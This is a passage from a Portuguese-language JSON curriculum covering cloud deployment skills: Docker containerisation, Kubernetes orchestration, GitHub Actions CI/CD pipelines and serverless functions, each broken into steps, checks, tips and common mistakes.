                                "Resiliência comprovada com retries e circuit breakers."
                              ],
                              "assessmentCriteria": [
                                "Configurações YAML sem erros de sintaxe ou validação (istioctl analyze passa).",
                                "Funcionalidades chave (tráfego, segurança, observability) 100% operacionais.",
                                "Performance otimizada: latência reduzida e alta disponibilidade.",
                                "Documentação completa com diagramas e comandos reproduzíveis.",
                                "Capacidade de troubleshooting autônomo via logs e dashboards.",
                                "Integração seamless com microsserviços existentes."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (ArgoCD, Helm).",
                                "Segurança da Informação: Políticas de autorização e criptografia em trânsito.",
                                "Cloud Computing: Deploy em EKS/GKE/AKS com managed service mesh.",
                                "Análise de Dados: Uso de métricas para ML em detecção de anomalias.",
                                "Redes: Conceitos avançados de SDN e proxying."
                              ],
                              "realWorldApplication": "Service meshes como Istio são usados por empresas como Google, Netflix e eBay para gerenciar milhares de microsserviços, habilitando deployments zero-downtime, proteção contra falhas em escala e insights em tempo real para otimização de custos e performance em produção."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.5.2",
                        "name": "Estratégias de Deploy de Serviços na Nuvem",
                        "description": "Métodos e ferramentas para implantar serviços de forma automatizada e escalável em plataformas de nuvem, incluindo containerização e pipelines de CI/CD.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.2.1",
                            "name": "Containerizar Aplicações com Docker",
                            "description": "Criar Dockerfiles, imagens e composições para empacotar serviços, facilitando o deploy consistente em ambientes de nuvem como AWS ECS ou Google Kubernetes Engine.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente Docker",
                                  "subSteps": [
                                    "Instale o Docker Desktop ou Docker Engine no seu sistema operacional (Windows, macOS ou Linux).",
                                    "Verifique a instalação executando 'docker --version' e 'docker run hello-world'.",
                                    "Configure um diretório de projeto vazio e crie um arquivo .dockerignore para excluir arquivos desnecessários como node_modules.",
                                    "Explore comandos básicos: docker ps, docker images, docker stop.",
                                    "Configure autenticação para um registry público como Docker Hub."
                                  ],
                                  "verification": "Execute 'docker run hello-world' com sucesso e liste imagens sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Docker Desktop",
                                    "Conta no Docker Hub",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Use Docker Desktop para iniciantes, pois inclui GUI para monitoramento.",
                                  "learningObjective": "Entender e configurar o ambiente Docker local para desenvolvimento.",
                                  "commonMistakes": [
                                    "Não habilitar WSL2 no Windows",
                                    "Esquecer de adicionar usuário ao grupo docker no Linux",
                                    "Ignorar .dockerignore levando a imagens grandes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar um Dockerfile para uma Aplicação Simples",
                                  "subSteps": [
                                    "Escolha uma aplicação de exemplo, como uma API Node.js com Express.",
                                    "Escreva instruções FROM (imagem base como node:18-alpine), COPY (código fonte), WORKDIR, RUN (instalar dependências), EXPOSE (porta), CMD (iniciar app).",
                                    "Otimize o Dockerfile: use multi-stage builds para reduzir tamanho.",
                                    "Adicione labels e healthchecks para monitoramento.",
                                    "Teste localmente com 'docker build -t minha-app .'"
                                  ],
                                  "verification": "O Dockerfile constrói sem erros e a imagem tem tamanho otimizado (<500MB).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Código fonte de uma app Node.js simples",
                                    "Documentação oficial Docker",
                                    "Dockerfile template"
                                  ],
                                  "tips": "Sempre use camadas em cache: coloque COPY package.json antes de npm install.",
                                  "learningObjective": "Dominar a sintaxe e melhores práticas para escrever Dockerfiles eficientes.",
                                  "commonMistakes": [
                                    "Usar imagens base grandes como node:latest",
                                    "Expor portas desnecessárias",
                                    "Rodar app como root (use USER node)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir, Testar e Executar Imagens Docker",
                                  "subSteps": [
                                    "Build a imagem: 'docker build -t minha-app:v1 .' e verifique com 'docker images'.",
                                    "Execute o container: 'docker run -p 3000:3000 minha-app:v1' e teste endpoints via curl ou browser.",
                                    "Implemente volumes para persistência: 'docker run -v $(pwd)/data:/app/data'.",
                                    "Execute testes dentro do container: adicione script de teste no Dockerfile.",
                                    "Limpe recursos: 'docker system prune' para remover imagens e containers não usados."
                                  ],
                                  "verification": "A app roda acessível em localhost:3000 e responde a requests HTTP corretamente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "App de exemplo com testes",
                                    "Ferramentas como curl ou Postman"
                                  ],
                                  "tips": "Use --rm para containers temporários e -it para interatividade.",
                                  "learningObjective": "Habilitar ciclo completo de build, run e debug de containers isolados.",
                                  "commonMistakes": [
                                    "Portas não mapeadas corretamente",
                                    "Volumes montados no caminho errado",
                                    "Não taggear imagens com versão"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Orquestrar com Docker Compose e Preparar para Deploy",
                                  "subSteps": [
                                    "Crie docker-compose.yml definindo services (app, db como postgres), networks e volumes.",
                                    "Inclua depends_on para ordem de inicialização e environment variables.",
                                    "Execute 'docker-compose up -d' e monitore logs com 'docker-compose logs'.",
                                    "Push imagens para registry: 'docker tag minha-app docker.io/seuuser/minha-app' e 'docker push'.",
                                    "Simule deploy: gere compose para Kubernetes ou ECS ajustando manifests."
                                  ],
                                  "verification": "Sistema multi-container inicia com 'docker-compose up' e todos services healthy.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Docker Compose instalado",
                                    "Imagem Postgres oficial",
                                    "Docker Hub CLI login"
                                  ],
                                  "tips": "Use profiles para ambientes dev/prod e healthchecks em services.",
                                  "learningObjective": "Gerenciar aplicações multi-container e preparar para orquestradores de nuvem.",
                                  "commonMistakes": [
                                    "Rede não definida causando falhas de comunicação",
                                    "Secrets não gerenciados",
                                    "Ignorar restart: unless-stopped"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar Deploy Consistente em Ambientes de Nuvem",
                                  "subSteps": [
                                    "Crie conta gratuita em AWS ECS ou GKE e configure CLI (aws cli ou gcloud).",
                                    "Converta docker-compose para task definition no ECS ou deployment YAML no GKE.",
                                    "Deploy a stack: use ECR ou GCR para hospedar imagens privadas.",
                                    "Monitore métricas: logs no CloudWatch ou kubectl logs.",
                                    "Teste rollouts: atualize imagem e verifique zero-downtime."
                                  ],
                                  "verification": "Aplicação acessível via load balancer na nuvem sem downtime.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Contas AWS/GCP free tier",
                                    "Terraform ou eksctl para clusters",
                                    "Helm charts opcionais"
                                  ],
                                  "tips": "Comece com Fargate no ECS para serverless containers.",
                                  "learningObjective": "Garantir portabilidade e consistência de deploys em nuvem.",
                                  "commonMistakes": [
                                    "IAM roles insuficientes",
                                    "Cluster não escalável",
                                    "Não configurar autoscaling"
                                  ]
                                }
                              ],
                              "practicalExample": "Containerize uma API Node.js de TODO list com banco PostgreSQL: crie Dockerfile otimizado, docker-compose.yml com app e db conectados via rede interna, push para Docker Hub e deploy no AWS ECS Fargate, acessível via ALB em 5 minutos.",
                              "finalVerifications": [
                                "Dockerfile constrói imagem <300MB que roda isoladamente.",
                                "Docker Compose orquestra app + db com healthchecks passando.",
                                "Imagem pushada para registry acessível publicamente.",
                                "Deploy simulado na nuvem responde a tráfego sem erros.",
                                "Logs mostram inicialização limpa e zero vulnerabilidades (docker scout).",
                                "Atualização de versão rola sem downtime."
                              ],
                              "assessmentCriteria": [
                                "Eficiência da imagem: tamanho otimizado e camadas em cache.",
                                "Robustez: healthchecks, restarts e volumes persistentes.",
                                "Segurança: non-root user, secrets management e scans limpos.",
                                "Escalabilidade: compose pronto para orquestradores.",
                                "Documentação: README com comandos exatos de build/deploy.",
                                "Testes: coverage >80% rodando no container."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (GitHub Actions, Jenkins).",
                                "Cloud Computing: Preparação para Kubernetes, ECS e serverless.",
                                "Programação: Otimização de apps para ambientes containerizados.",
                                "Segurança da Informação: Scanning de vulnerabilidades (Trivy, Clair).",
                                "Gestão de Projetos: Versionamento de infra como código."
                              ],
                              "realWorldApplication": "Empresas como Netflix e Spotify usam Docker para deploy consistente de microsserviços em Kubernetes, permitindo atualizações rápidas, escalabilidade horizontal e isolamento de falhas em produção global."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.2",
                            "name": "Orquestrar Serviços com Kubernetes",
                            "description": "Configurar clusters Kubernetes para deploy, escalabilidade automática, rolling updates e gerenciamento de configurações em serviços na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar um Cluster Kubernetes Local",
                                  "subSteps": [
                                    "Instalar ferramentas pré-requisitas: kubectl, Minikube ou kind.",
                                    "Iniciar o cluster com Minikube: `minikube start`.",
                                    "Verificar o status do cluster: `kubectl cluster-info` e `kubectl get nodes`.",
                                    "Configurar contexto do kubectl para o cluster local.",
                                    "Explorar namespaces padrão com `kubectl get namespaces`."
                                  ],
                                  "verification": "Executar `kubectl get nodes` e confirmar que o nó está no status 'Ready'.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Minikube ou kind instalado",
                                    "kubectl",
                                    "Máquina com pelo menos 4GB RAM e Docker"
                                  ],
                                  "tips": [
                                    "Use Minikube para simplicidade em desenvolvimento local.",
                                    "Ative o dashboard com `minikube dashboard` para visualização gráfica."
                                  ],
                                  "learningObjective": "Entender e configurar um ambiente Kubernetes funcional localmente.",
                                  "commonMistakes": [
                                    "Esquecer de inicializar o driver Docker.",
                                    "Portas conflitantes no host.",
                                    "Não verificar recursos de hardware suficientes."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Deploy de um Serviço Simples no Cluster",
                                  "subSteps": [
                                    "Criar um Deployment YAML básico para uma aplicação web (ex: nginx).",
                                    "Aplicar o Deployment: `kubectl apply -f deployment.yaml`.",
                                    "Expor o Deployment como Service: `kubectl expose deployment/nginx --type=LoadBalancer --port=80`.",
                                    "Verificar pods e services: `kubectl get pods` e `kubectl get services`.",
                                    "Acessar a aplicação via `minikube service nginx`."
                                  ],
                                  "verification": "Acessar a URL do service e ver a página nginx carregando.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Editor de texto (VS Code com extensão Kubernetes)",
                                    "YAML templates de exemplo",
                                    "Imagem Docker nginx:latest"
                                  ],
                                  "tips": [
                                    "Use `kubectl describe pod <nome>` para debug.",
                                    "Valide YAML com `kubectl apply --dry-run=client -f arquivo.yaml`."
                                  ],
                                  "learningObjective": "Dominar o ciclo básico de deploy de aplicações stateless.",
                                  "commonMistakes": [
                                    "Erros de indentação no YAML.",
                                    "Imagem Docker não pullada corretamente.",
                                    "Service type incorreto para exposição."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Escalabilidade Automática (HPA)",
                                  "subSteps": [
                                    "Instalar Metrics Server: `minikube addons enable metrics-server`.",
                                    "Criar um HorizontalPodAutoscaler (HPA) YAML targeting CPU usage.",
                                    "Aplicar HPA: `kubectl apply -f hpa.yaml`.",
                                    "Simular load com ferramentas como `hey` ou `kubectl run load-generator`.",
                                    "Monitorar escalabilidade: `kubectl get hpa` e `kubectl top pods`."
                                  ],
                                  "verification": "Observar réplicas aumentando sob load e estabilizando após.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Metrics Server addon",
                                    "Ferramenta de load testing (hey)",
                                    "YAML HPA template"
                                  ],
                                  "tips": [
                                    "Defina thresholds realistas (ex: 50% CPU).",
                                    "Use `kubectl autoscale` para comandos rápidos."
                                  ],
                                  "learningObjective": "Configurar auto-scaling baseado em métricas de recursos.",
                                  "commonMistakes": [
                                    "Metrics Server não habilitado.",
                                    "Thresholds irreais causando thrashing.",
                                    "Falta de requests/limits nos deployments."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Rolling Updates",
                                  "subSteps": [
                                    "Adicionar strategy rollingUpdate no Deployment YAML (maxUnavailable, maxSurge).",
                                    "Atualizar imagem da app e aplicar: `kubectl set image deployment/nginx nginx=nginx:1.19`.",
                                    "Monitorar rollout: `kubectl rollout status deployment/nginx`.",
                                    "Rollback se necessário: `kubectl rollout undo deployment/nginx`.",
                                    "Verificar histórico: `kubectl rollout history deployment/nginx`."
                                  ],
                                  "verification": "Aplicação continua disponível durante update sem downtime.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Deployment YAML com strategy",
                                    "kubectl"
                                  ],
                                  "tips": [
                                    "Use `kubectl patch` para testes rápidos.",
                                    "Monitore logs com `kubectl logs -f`."
                                  ],
                                  "learningObjective": "Garantir updates zero-downtime com estratégias controladas.",
                                  "commonMistakes": [
                                    "maxUnavailable muito alto causando downtime.",
                                    "Readiness probes ausentes.",
                                    "Ignorar verificação de rollout status."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Gerenciar Configurações com ConfigMaps e Secrets",
                                  "subSteps": [
                                    "Criar ConfigMap: `kubectl create configmap app-config --from-literal=DB_HOST=localhost`.",
                                    "Criar Secret: `kubectl create secret generic db-pass --from-literal=password=secret123`.",
                                    "Mountar no Deployment YAML (volumes e volumeMounts).",
                                    "Aplicar e verificar: `kubectl exec -it pod -- env | grep CONFIG`.",
                                    "Atualizar ConfigMap e restart pods seletivo."
                                  ],
                                  "verification": "Pods acessam configs corretamente via `kubectl exec`.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "YAML para ConfigMap/Secret",
                                    "kubectl"
                                  ],
                                  "tips": [
                                    "Use `--from-file` para múltiplos arquivos.",
                                    "Evite secrets em YAML plain text."
                                  ],
                                  "learningObjective": "Gerenciar dados sensíveis e configs de forma segura e desacoplada.",
                                  "commonMistakes": [
                                    "Mount path incorreto.",
                                    "Secrets expostos em logs.",
                                    "Falta de restart após update de ConfigMap."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolver e deployar uma API Node.js com banco PostgreSQL: crie Deployment para API e DB, exponha services, configure HPA para API sob load de requests, aplique rolling update na versão da API, e gerencie conexão DB via ConfigMap/Secret.",
                              "finalVerifications": [
                                "Cluster Kubernetes rodando com todos nós 'Ready'.",
                                "Aplicação deployada acessível sem downtime durante updates.",
                                "HPA escala pods automaticamente sob load simulado.",
                                "Configurações injetadas corretamente nos pods.",
                                "Rollback de deployment funciona perfeitamente.",
                                "Métricas disponíveis via `kubectl top`."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de YAML sem erros de sintaxe.",
                                "Zero downtime demonstrado em rolling updates.",
                                "Escalabilidade automática responde corretamente a métricas.",
                                "Uso seguro de ConfigMaps/Secrets sem exposição.",
                                "Monitoramento e troubleshooting eficaz durante o processo.",
                                "Documentação clara dos comandos executados."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (Jenkins, GitHub Actions).",
                                "Cloud Computing: Migração para EKS/GKE/AKS.",
                                "Segurança da Informação: RBAC e Network Policies em K8s.",
                                "Desenvolvimento de Software: Microservices e containerização com Docker.",
                                "Gestão de Projetos: Monitoramento com Prometheus/Grafana."
                              ],
                              "realWorldApplication": "Empresas como Netflix e Google usam Kubernetes para orquestrar milhares de microservices em produção, garantindo alta disponibilidade, escalabilidade automática durante picos de tráfego e deploys contínuos sem interrupções, otimizando custos na nuvem."
                            },
                            "estimatedTime": "6 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.3",
                            "name": "Implementar Pipelines de CI/CD",
                            "description": "Configurar pipelines com ferramentas como Jenkins, GitHub Actions ou GitLab CI para automação de build, teste e deploy contínuo de serviços na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Repositório e Ambiente de CI/CD",
                                  "subSteps": [
                                    "Crie ou selecione um repositório GitHub com uma aplicação simples (ex: Node.js ou Python).",
                                    "Habilite GitHub Actions nas configurações do repositório (Settings > Actions > General).",
                                    "Configure secrets no repositório (Settings > Secrets and variables > Actions) para chaves de API de nuvem (ex: AWS_ACCESS_KEY).",
                                    "Crie a pasta .github/workflows no repositório.",
                                    "Adicione um arquivo .gitignore para ignorar node_modules ou arquivos sensíveis."
                                  ],
                                  "verification": "Confirme que a pasta .github/workflows existe, secrets estão listados e um push inicial aciona workflows sem erros.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Conta GitHub gratuita",
                                    "Repositório Git com código-fonte básico",
                                    "Documentação GitHub Actions: https://docs.github.com/en/actions"
                                  ],
                                  "tips": "Comece com repositórios públicos para testes iniciais e migre para privados depois.",
                                  "learningObjective": "Configurar infraestrutura básica para pipelines CI/CD usando GitHub Actions.",
                                  "commonMistakes": [
                                    "Expor secrets diretamente no YAML em vez de usar GitHub Secrets.",
                                    "Esquecer de habilitar workflows em repositórios privados.",
                                    "Não versionar o workflow YAML corretamente."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir e Implementar Workflow Básico de Build e Teste",
                                  "subSteps": [
                                    "Crie o arquivo .github/workflows/ci.yml com triggers on: push e pull_request.",
                                    "Adicione job de checkout do código e setup da linguagem (ex: actions/setup-node@v4).",
                                    "Implemente steps para install dependencies (npm install), linting (npm run lint) e testes unitários (npm test).",
                                    "Configure cache para acelerar builds (actions/cache@v4 para node_modules).",
                                    "Commit e push o workflow para testar execução automática."
                                  ],
                                  "verification": "Verifique no GitHub Actions tab que o workflow roda com sucesso em build e testes no push.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Aplicação de exemplo com package.json e testes (ex: Jest)",
                                    "Documentação YAML GitHub Actions"
                                  ],
                                  "tips": "Use matrix strategy para testar múltiplas versões de Node.js simultaneamente.",
                                  "learningObjective": "Criar um pipeline YAML que automatiza build e testes de forma confiável.",
                                  "commonMistakes": [
                                    "Indentação incorreta no YAML causando falhas de parse.",
                                    "Não usar cache, resultando em builds lentos.",
                                    "Testes falhando por dependências não instaladas corretamente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Automação de Deploy para Serviços na Nuvem",
                                  "subSteps": [
                                    "Adicione um job de deploy condicional (if: github.ref == 'refs/heads/main').",
                                    "Configure build de produção (npm run build) e artefatos (actions/upload-artifact).",
                                    "Integre ação de deploy (ex: aws-actions/configure-aws-credentials para AWS ou appleboy/ssh-action para servidores).",
                                    "Use environment variables de secrets para autenticação na nuvem.",
                                    "Teste deploy manual via workflow_dispatch trigger."
                                  ],
                                  "verification": "Confirme que um push na main branch faz deploy automático e a app está acessível na nuvem (ex: URL do serviço).",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Conta AWS/Heroku gratuita com IAM user",
                                    "Secrets configurados (AWS_ACCESS_KEY_ID, etc.)",
                                    "Documentação AWS Actions ou Heroku CLI"
                                  ],
                                  "tips": "Comece com deploys para ambientes de staging antes de produção.",
                                  "learningObjective": "Automatizar deploys seguros e idempotentes para plataformas de nuvem.",
                                  "commonMistakes": [
                                    "Deploy em branches erradas sem condições if.",
                                    "Permissões IAM insuficientes causando falhas de auth.",
                                    "Não limpar artefatos antigos, consumindo storage."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adicionar Monitoramento, Notificações e Otimização",
                                  "subSteps": [
                                    "Integre notificações (ex: slack-github-action para Slack ou email).",
                                    "Adicione steps de qualidade (coverage com nyc/jest e sonarcloud-scan).",
                                    "Configure monitoramento com badges no README (shields.io para status).",
                                    "Otimize com parallel jobs e reuse de workflows compostos.",
                                    "Execute um ciclo completo: push, teste, deploy e verifique logs."
                                  ],
                                  "verification": "Pipeline completo roda end-to-end com notificações enviadas e coverage >80% em logs do Actions.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Conta Slack ou email para notificações",
                                    "Ferramentas como SonarCloud (gratuito)",
                                    "Documentação GitHub badges"
                                  ],
                                  "tips": "Use reusable workflows para pipelines modulares em múltiplos repositórios.",
                                  "learningObjective": "Tornar pipelines observáveis e otimizados para uso em produção.",
                                  "commonMistakes": [
                                    "Notificações em todos os jobs, gerando spam.",
                                    "Ignorar falhas silenciosas sem retry ou alerts.",
                                    "Pipelines muito complexos sem paralelismo."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar, Testar Rollback e Documentar o Pipeline",
                                  "subSteps": [
                                    "Simule falhas (ex: break um teste) e verifique se deploy é bloqueado.",
                                    "Implemente rollback manual via workflow com deploy para versão anterior.",
                                    "Gere documentação no README com diagrama do pipeline (Mermaid).",
                                    "Teste em branch feature e merge via PR com required status checks.",
                                    "Revise e refatore o YAML para idempotência."
                                  ],
                                  "verification": "PR requer aprovação de CI/CD passing, rollback funciona e docs estão no README.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramenta Mermaid para diagramas",
                                    "Branch protection rules no GitHub"
                                  ],
                                  "tips": "Ative branch protection para main requerendo CI/CD status.",
                                  "learningObjective": "Garantir robustez, segurança e documentação do pipeline completo.",
                                  "commonMistakes": [
                                    "Sem status checks em PRs, permitindo merges quebrados.",
                                    "Rollback não testado, causando downtime.",
                                    "YAML não versionado com mudanças sem changelog."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma API REST simples em Node.js com Express e Jest tests. Configure GitHub Actions para: build/teste em todo push/PR, deploy auto para AWS ECS na main, com notificações Slack em falhas e coverage report. Simule deploy de uma app de e-commerce que processa pedidos.",
                              "finalVerifications": [
                                "Pipeline executa completamente sem erros em push para main.",
                                "Testes unitários passam com coverage >= 80%.",
                                "Deploy bem-sucedido com app acessível via URL pública na nuvem.",
                                "Notificações enviadas corretamente em sucesso/falha.",
                                "Rollback possível restaurando versão anterior.",
                                "Status badges atualizados no README.",
                                "PRs bloqueados até CI/CD passar."
                              ],
                              "assessmentCriteria": [
                                "YAML sintaticamente correto e idempotente.",
                                "Cobertura completa de build, teste e deploy.",
                                "Uso seguro de secrets e permissões mínimas.",
                                "Tempo de pipeline otimizado (<10min end-to-end).",
                                "Tratamento de erros e retries implementados.",
                                "Documentação clara com diagrama e instruções.",
                                "Integração com ferramentas de nuvem (AWS/GCP)."
                              ],
                              "crossCurricularConnections": [
                                "DevOps e Administração de Sistemas: Infraestrutura como Código (IaC).",
                                "Segurança da Informação: Gerenciamento de secrets e scans de vulnerabilidades.",
                                "Gestão de Projetos: Metodologias Ágeis e Kanban para releases.",
                                "Desenvolvimento de Software: Test-Driven Development (TDD) integrado.",
                                "Redes e Nuvem: Configuração de VPCs e load balancers."
                              ],
                              "realWorldApplication": "Em empresas como Netflix ou Google, pipelines CI/CD com GitHub Actions/Jenkins automatizam deploys diários de microsserviços na nuvem, reduzindo tempo de release de semanas para minutos, minimizando erros humanos e habilitando feature flags para A/B testing em produção."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.4",
                            "name": "Gerenciar Deploy em Plataformas Serverless",
                            "description": "Desenvolver e implantar funções serverless em AWS Lambda, Azure Functions ou Google Cloud Functions, otimizando para escalabilidade e custo em aplicações distribuídas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configuração Inicial do Ambiente Serverless",
                                  "subSteps": [
                                    "Escolha a plataforma (ex: AWS Lambda, Azure Functions ou Google Cloud Functions) e crie uma conta gratuita se necessário.",
                                    "Instale as ferramentas CLI: AWS CLI, Azure CLI ou gcloud SDK, e autentique com credenciais.",
                                    "Instale frameworks como Serverless Framework ou SAM (AWS) para simplificar deploys.",
                                    "Crie um novo projeto serverless com template básico (ex: serverless create --template aws-nodejs).",
                                    "Configure variáveis de ambiente e IAM roles/permissões mínimas necessárias."
                                  ],
                                  "verification": "Verifique se o CLI está autenticado (ex: aws sts get-caller-identity) e o projeto foi criado sem erros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Conta na nuvem (AWS/Azure/GCP), Node.js/Python runtime, CLI tools, editor de código (VS Code).",
                                  "tips": "Use contas free-tier para evitar custos iniciais; comece com AWS para maior maturidade em serverless.",
                                  "learningObjective": "Configurar ambiente pronto para desenvolvimento serverless com autenticação segura.",
                                  "commonMistakes": "Esquecer de configurar IAM roles corretas levando a erros de permissão; usar credenciais hardcoded."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolvimento e Teste Local da Função",
                                  "subSteps": [
                                    "Escreva o código da função handler (ex: processar JSON input em Node.js/Python).",
                                    "Adicione dependências no package.json/requirements.txt e configure layers se necessário.",
                                    "Implemente logging e error handling com try-catch.",
                                    "Teste localmente usando serverless invoke local ou sam local invoke.",
                                    "Valide inputs/outputs com mocks de eventos (ex: API Gateway event)."
                                  ],
                                  "verification": "Execute testes locais com pelo menos 3 cenários (sucesso, erro, edge case) e confirme logs/output corretos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Código editor, runtime local (Node/Python), mocks de eventos JSON.",
                                  "tips": "Use bibliotecas como Middy (AWS) para middlewares que simplificam logging e validação.",
                                  "learningObjective": "Desenvolver funções serverless funcionais e testáveis localmente sem deploy.",
                                  "commonMistakes": "Ignorar cold starts testando só warm functions; não mockar eventos reais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Deploy e Configuração de Triggers",
                                  "subSteps": [
                                    "Configure serverless.yml com functions, events (API Gateway, S3 trigger, etc.) e regiões.",
                                    "Execute deploy: serverless deploy ou sam deploy.",
                                    "Teste a função invocada via trigger (ex: POST para endpoint API Gateway).",
                                    "Configure CORS, throttling e timeouts se aplicável.",
                                    "Atualize configurações de VPC/segurança se necessário."
                                  ],
                                  "verification": "Confirme URL/ARN da função no console da nuvem e teste end-to-end com curl/Postman.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Framework CLI (Serverless/SAM), Postman para testes HTTP.",
                                  "tips": "Use --stage dev para ambientes isolados; monitore deploy logs em tempo real.",
                                  "learningObjective": "Implantar funções serverless conectadas a eventos reais com alta disponibilidade.",
                                  "commonMistakes": "Configurar timeouts muito baixos causando falhas; esquecer de expor endpoints públicos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Otimização para Escalabilidade, Custo e Monitoramento",
                                  "subSteps": [
                                    "Analise métricas no console (invocações, duração, erros) e configure CloudWatch/X-Ray.",
                                    "Otimize código: reduza pacotes, use provisioned concurrency para cold starts.",
                                    "Configure budgets/alertas de custo e dead-letter queues para falhas.",
                                    "Teste escalabilidade simulando load com ferramentas como Artillery.",
                                    "Implemente versioning/aliases para updates sem downtime."
                                  ],
                                  "verification": "Monitore 10+ invocações simultâneas sem erros e confirme custos < R$0.10 em teste.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Console da nuvem, ferramentas de load test (Artillery), X-Ray tracing.",
                                  "tips": "Prefira ARM64 runtimes para economia; use powertools para logging padronizado.",
                                  "learningObjective": "Otimizar deploys serverless para performance custo-efetiva em produção.",
                                  "commonMistakes": "Não configurar DLQ levando a perda de eventos; ignorar custos de logs excessivos."
                                }
                              ],
                              "practicalExample": "Desenvolva e implante uma função AWS Lambda acionada por S3 upload que redimensiona imagens com Sharp, expõe via API Gateway, otimiza para 1000+ uploads/dia custando < R$1/mês, com monitoramento via CloudWatch.",
                              "finalVerifications": [
                                "Função deployada responde corretamente a triggers em < 500ms.",
                                "Métricas de CloudWatch mostram zero erros em 50+ testes.",
                                "Custos estimados abaixo de 20% do free-tier limite.",
                                "Cold starts < 2s com provisioned concurrency.",
                                "Logs e traces disponíveis para debugging.",
                                "Função escalável para 1000 RPS sem throttling."
                              ],
                              "assessmentCriteria": [
                                "Corretude: 100% dos testes passam sem erros.",
                                "Eficiência: Duração média < 300ms, bundle < 50MB.",
                                "Segurança: Permissões least-privilege, sem segredos hardcoded.",
                                "Escalabilidade: Lida com load spikes sem falhas.",
                                "Custo-otimização: Alertas configurados e uso eficiente.",
                                "Documentação: README com deploy instructions e troubleshooting."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD (GitHub Actions, Jenkins).",
                                "Arquitetura de Software: Microservices e event-driven design.",
                                "Segurança da Informação: IAM, encryption em trânsito/reposo.",
                                "Gestão de Projetos: Estimativa de custos e SLAs em nuvem."
                              ],
                              "realWorldApplication": "Em e-commerce, gerencie deploys serverless para processar pagamentos via Stripe webhooks, escalando automaticamente para Black Friday sem servidores provisionados, reduzindo custos em 70% vs. EC2."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.4",
                "name": "Desenvolvimento de aplicações para a Nuvem",
                "description": "Aborda o desenvolvimento de software utilizando plataformas de computação em nuvem, enfatizando escalabilidade e agilidade.",
                "totalSkills": 44,
                "atomicTopics": [
                  {
                    "id": "10.1.4.1",
                    "name": "Modelos de Serviço em Computação em Nuvem",
                    "description": "Definição e características de IaaS, PaaS e SaaS para desenvolvimento de aplicações.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.1.1",
                        "name": "Infrastructure as a Service (IaaS)",
                        "description": "Modelo de serviço em nuvem que fornece infraestrutura virtualizada, como servidores, armazenamento e redes, permitindo que desenvolvedores gerenciem sistemas operacionais e aplicações diretamente.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.1.1",
                            "name": "Definir IaaS",
